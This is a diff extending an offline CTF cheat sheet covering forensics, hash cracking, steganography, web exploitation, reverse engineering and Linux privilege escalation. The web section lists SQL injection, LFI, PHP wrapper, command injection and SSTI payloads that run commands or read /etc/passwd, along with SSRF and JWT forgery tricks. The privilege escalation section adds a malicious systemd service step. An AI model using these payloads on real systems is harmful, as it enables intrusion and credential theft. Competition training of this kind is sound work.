@@ -1,11 +1,11 @@
 # Hack4Gov Master Offline CTF Cheatsheet
-> Complete offline competition quick-reference guide for Forensics, Network PCAPs, Steganography, Web Exploitation, and Reverse Engineering.
+> Complete offline competition quick-reference guide for Forensics, Network PCAPs, Steganography, Cryptography, Web Exploitation, Reverse Engineering, and Linux Privilege Escalation.
 
 ---
 
 ## 1. File Signatures & Header Forensics (Magic Bytes)
 
-When files are corrupted or disguised (e.g. an ELF or ZIP renamed to `.pdf` or `.png`), inspect the first 16 bytes:
+When files are corrupted, truncated, or disguised (e.g. an ELF or ZIP renamed to `.pdf` or `.png`), inspect the first 16 bytes:
 ```bash
 # View file header in hex:
 xxd -l 16 file.bin
@@ -36,6 +36,7 @@ python -c '
 with open("corrupted.png", "r+b") as f:
     f.seek(0)
     f.write(bytes.fromhex("89504E470D0A1A0A"))
+print("[+] Header restored to PNG.")
 '
 ```
 
@@ -78,11 +79,48 @@ tshark -r capture.pcap -Y 'http.request.method == "POST"' -T fields -e http.file
 
 # Extract all unique DNS queries (checking for DNS tunnel / base64 exfiltration):
 tshark -r capture.pcap -T fields -e dns.qry.name | sort -u
+
+# Extract transmitted credentials:
+tshark -r capture.pcap -Y 'http contains "password" || http contains "passwd"' -T fields -e text
 ```
 
 ---
 
-## 4. Steganography (Images, Audio, ZIPs)
+## 4. Cryptography & Offline Hash Cracking
+
+### A. Multi-Hash Generation & Identification (`hasher.py`)
+```bash
+# Multi-hash string (MD5, SHA1, SHA256, SHA512, NTLM):
+python Tools/Crypto/hasher.py -s "target_string"
+
+# Hash evidence file:
+python Tools/Crypto/hasher.py -f test_evidence.bin
+
+# Identify unknown hash format:
+python Tools/Crypto/hasher.py -i "5d41402abc4b2a76b9719d911017c592"
+```
+
+### B. High-Speed Multi-Core Unhasher (`unhasher.py`)
+```bash
+# 1. Multi-core dictionary crack directly from rockyou.txt.gz (in-memory streaming):
+python Tools/Crypto/unhasher.py -t "5f4dcc3b5aa765d61d8327deb882cf99" -w ../rockyou.txt.gz
+
+# 2. Dictionary crack with rule mutations (numbers, dates, case, leetspeak):
+python Tools/Crypto/unhasher.py -t "<TARGET_HASH>" -w ../rockyou.txt.gz -m
+
+# 3. Fast pre-scan top 100,000 words in <1 sec:
+python Tools/Crypto/unhasher.py -t "<TARGET_HASH>" -w ../rockyou.txt.gz --top 100000
+
+# 4. 8-core brute-force 4-digit PIN (instant <0.2s):
+python Tools/Crypto/unhasher.py -t "e48e13207341b6bffb7fb1622282247b" -b --charset digits --max-len 4
+
+# 5. 8-core brute-force lowercase alphanumeric up to length 4:
+python Tools/Crypto/unhasher.py -t "21232f297a57a5a743894a0e4a801fc3" -b --charset alphanum --max-len 4
+```
+
+---
+
+## 5. Steganography & Signals (Images, Audio, ZIPs)
 
 ### A. Image Steganography
 ```bash
@@ -94,55 +132,45 @@ zsteg -a image.png
 
 # 3. Steghide (Extract password-protected JPEG payload):
 steghide extract -sf image.jpg -p ""
-# If password required, crack with wordlist:
-# steghide extract -sf image.jpg -p "<PASSWORD>"
 
-# 4. Outguess (Extract payload from JPEG):
+# 4. Stegseek (Fast rockyou dictionary crack for JPEG):
+stegseek image.jpg ../rockyou.txt.gz
+
+# 5. Outguess (Extract payload from JPEG):
 outguess -r image.jpg extracted_flag.txt
 ```
 
-### B. Audio Steganography & Signals
-* **Morse Code Audio / Text Signals**:
-  ```bash
-  # 1. Live interactive listener REPL (Auto-detects Morse vs Text):
-  python Tools/Crypto/morse.py -l
+### B. Audio Signals & Morse Code (`morse.py`)
+```bash
+# 1. Live interactive listener REPL (Auto-detects Morse vs Text):
+python Tools/Crypto/morse.py -l
 
-  # 2. Interactive mouse & keyboard tapper (Left Click: '.', Right Click: '-', Space: Break):
-  python Tools/Crypto/morse.py -t -s
+# 2. Interactive mouse & keyboard tapper (Left Click: '.', Right Click: '-', Space: Break):
+python Tools/Crypto/morse.py -t -s
 
-  # 3. Automatic pulse decoder from .wav audio recording:
-  python Tools/Crypto/morse.py -a audio_challenge.wav
+# 3. Automatic pulse decoder from .wav audio recording:
+python Tools/Crypto/morse.py -a audio_challenge.wav
 
-  # 4. Live real-time microphone audio Morse listener:
-  python Tools/Crypto/morse.py --mic
+# 4. Live real-time microphone audio Morse listener (Speech-filtered):
+python Tools/Crypto/morse.py --mic
 
-  # 5. Direct decode / encode:
-  python Tools/Crypto/morse.py -d "... --- ..."
-  python Tools/Crypto/morse.py -e "HACK4GOV{FLAG}" -s
-
-  # 6. TypeScript real-time listener & transcript logger:
-  node Tools/Crypto/morse.ts --listen
-  node Tools/Crypto/morse.ts --listen --transcript session.log
-  ```
-* **Sonic Visualiser**:
-  - Open `.wav` file $\rightarrow$ `Pane` $\rightarrow$ `Add Spectrogram` $\rightarrow$ Change channel to All.
-  - Look for text or numbers written in high-frequency audio spectra.
-* **DTMF Tones (Dial Tones)**:
-  - If audio sounds like telephone keypad beeps: use an online/offline DTMF decoder.
+# 5. Direct decode string:
+python Tools/Crypto/morse.py -d "... --- ..."
+```
 
 ### C. ZIP / Archive Cracking
 ```bash
-# Crack encrypted ZIP using rockyou.txt:
-fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt target.zip
+# Crack encrypted ZIP using rockyou.txt.gz:
+fcrackzip -u -D -p ../rockyou.txt.gz target.zip
 
 # Or using zip2john:
 zip2john target.zip > hash.txt
-john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+john --wordlist=../rockyou.txt.gz hash.txt
 ```
 
 ---
 
-## 5. Web Exploitation Quick-Reference
+## 6. Web Exploitation Quick-Reference
 
 ### A. SQL Injection Authentication Bypasses
 Test in username/password login fields:
@@ -155,14 +183,15 @@ admin' #
 ' OR '1'='1
 ```
 
-### B. Local File Inclusion (LFI) & Path Traversal
+### B. Local File Inclusion (LFI) & PHP Wrappers
 ```
 ../../../../etc/passwd
 /etc/passwd
 /var/log/apache2/access.log
 php://filter/convert.base64-encode/resource=index.php
+php://input  (with POST payload: <?php system('id'); ?>)
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&cmd=id
 ```
-*(Decodes base64 returned to read server source code).*
 
 ### C. Command Injection Bypasses
 ```bash
@@ -172,40 +201,69 @@ $(id)
 `id`
 %0a id
 ;cat$IFS/etc/passwd
+;cat$IFS$9/etc/passwd
+;sh<<<$(base64$IFS-d<<<Y2F0IC9ldGMvcGFzc3dk)
 ```
 
-### D. JWT (JSON Web Token) Quick Inspection
+### D. Server-Side Template Injection (SSTI)
+- **Jinja2 (Python)**:
+  ```
+  {{7*7}} -> 49
+  {{config.items()}}
+  {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+  ```
+- **Twig / PHP**:
+  ```
+  {{7*7}}
+  {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+  ```
+
+### E. Server-Side Request Forgery (SSRF)
+```
+http://127.0.0.1:80/admin
+http://localhost:8080/
+http://0.0.0.0/
+http://[::1]/
+http://2130706433/       (Decimal IP for 127.0.0.1)
+http://0177.0.0.1/       (Octal IP for 127.0.0.1)
+```
+
+### F. JWT (JSON Web Token) Attacks
 A JWT consists of 3 Base64URL parts: `HEADER.PAYLOAD.SIGNATURE`.
 - **None Algorithm Attack**: Change header `{"alg":"HS256"}` to `{"alg":"none"}` and strip signature.
-- **Payload Editing**: Decode payload in CyberChef $\rightarrow$ change `"role":"user"` to `"role":"admin"`.
+- **Role Elevation**: Decode payload in CyberChef $\rightarrow$ change `"role":"user"` to `"role":"admin"`.
 
 ---
 
-## 6. Reverse Engineering & Binary Triage
+## 7. Reverse Engineering & Binary Triage
 
 ```bash
-# 1. Identify architecture and binary format:
-file binary_name
+# 1. 1-Second automated binary triage:
+python Tools/Reversing/rev_triage.py binary_name
 
-# 2. Check binary security protections (PIE, Canary, NX):
+# 2. Check binary architecture & security protections:
+file binary_name
 checksec --file=binary_name
 
 # 3. Search strings for hardcoded flags or credentials:
 strings -a binary_name | grep -iE "flag|hack4gov|pass|key"
 
 # 4. Trace dynamic library and system calls:
-ltrace ./binary_name    # Shows strcmp, strncmp, printf (often leaks flag comparison!)
-strace ./binary_name    # Shows file read/open/socket operations
+ltrace -s 128 ./binary_name    # Shows strcmp, strncmp, printf (often leaks flag comparison!)
+strace ./binary_name           # Shows file read/open/socket operations
 
-# 5. Decompilation Workflow (Ghidra):
-# 1. Create project -> Import binary.
-# 2. Auto-analyze -> Look at Symbol Tree (Filter for 'main', 'validate', 'check').
-# 3. Review the C decompiler window on the right.
+# 5. GDB Breakpoints & Register Inspection:
+# gdb -q ./binary_name
+# (gdb) break *main
+# (gdb) run
+# (gdb) x/s $rdi
+# (gdb) x/s $rsi
+# (gdb) x/s $rax
 ```
 
 ---
 
-## 7. Linux Privilege Escalation (Post-Exploitation)
+## 8. Linux Privilege Escalation (Post-Exploitation)
 
 ```bash
 # 1. Check user sudo privileges:
@@ -214,10 +272,17 @@ sudo -l
 # 2. Find SUID binaries (executables running as root):
 find / -perm -4000 -type f 2>/dev/null
 
-# 3. Look up SUID binary bypasses on GTFOBins:
+# 3. Check Linux file capabilities:
+getcap -r / 2>/dev/null
+
+# 4. Look up SUID / Sudo binary bypasses on GTFOBins:
 # https://gtfobins.github.io/
 
-# 4. Check writable /etc/passwd or scheduled cron jobs:
+# 5. Check writable /etc/passwd or scheduled cron jobs:
 cat /etc/crontab
 ls -la /etc/cron.*
+
+# 6. Malicious Systemd Service Escalation (Tools/root.service):
+# cp Tools/root.service /etc/systemd/system/
+# systemctl enable --now root.service
 ```
